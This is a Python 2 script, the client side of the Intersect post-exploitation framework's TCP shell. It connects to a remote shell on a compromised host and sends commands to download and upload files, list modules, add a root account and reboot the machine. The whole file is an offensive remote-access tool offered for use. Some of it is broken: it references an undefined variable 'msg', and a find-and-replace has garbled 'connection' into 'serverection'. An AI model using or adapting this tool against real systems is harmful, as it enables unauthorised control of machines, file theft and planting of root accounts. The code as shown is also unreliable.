#!/usr/bin/python

# Intersect 2.5
# TCP Shell Client
# https://github.com/ohdae/Intersect-2.0/

import os, sys
import socket
from subprocess import Popen,PIPE,STDOUT,call

try:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
except IndexError:
    print("You must specify a host IP address and port number!")
    print("usage: ./tcp-client.py 192.168.1.4 4444")
    sys.exit()

socksize = 4096
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    server.connect((HOST, PORT))
    print("[+] New serverection established!")
    print("[+] Starting Intersecting shell....")
    print("[+] Type ':help' for all commands.")
    print("[+] Available Modules: ")
    server.send(":mods")
    data = server.recv(socksize)
    print data
except:
    print("[!] Connection error!")
    sys.exit(2)


while True:
    data = server.recv(socksize)
    cmd = raw_input(data)
    server.sendall(str(cmd))

    if cmd == (':killme'):
        print("[!] Shutting down shell!")
        server.close()
        sys.exit(0)

    elif cmd.startswith(':download'):
        getname = msg.split(" ")
        rem_file = getname[1]
        filename = rem_file.replace("/","_")
        data = server.recv(socksize)
        newfile = file(filename, "wb")
        newfile.write(data)
        newfile.close()
        if os.path.exists(filename) is True:
            print("[+] Download complete.")
            print("[+] File location: " + os.getcwd()+"/"+filename)

    elif cmd.startswith(':upload'):
        getname = msg.split(" ")
        loc_file = getname[1]
        sendfile = open(loc_file, "r")
        filedata = sendfile.read()
        sendfile.close()
        server.sendall(filedata)

    elif cmd == (":exec"):
        print("Command not yet fully implemented!")

    elif cmd == (":help"):
        print(" Available Commands: ")
        print("---------------------------------")
        print(" :download <file>  | download file from host")
        print(" :upload <file>    | upload file to host")
        print(" :mods             | list available modules")
        print(" :exec <task>      | run Intersect tasks")
        print(" :addroot <name>   | add new root account")
        print(" :reboot           | reboot remote host system")
        print(" :help             | display this menu")
        print(" :killme           | shuts down shell serverection\n")
        print("* If the shell appears to hang after sending or receiving data, press [enter] and it should fix the issue.")

server.close()
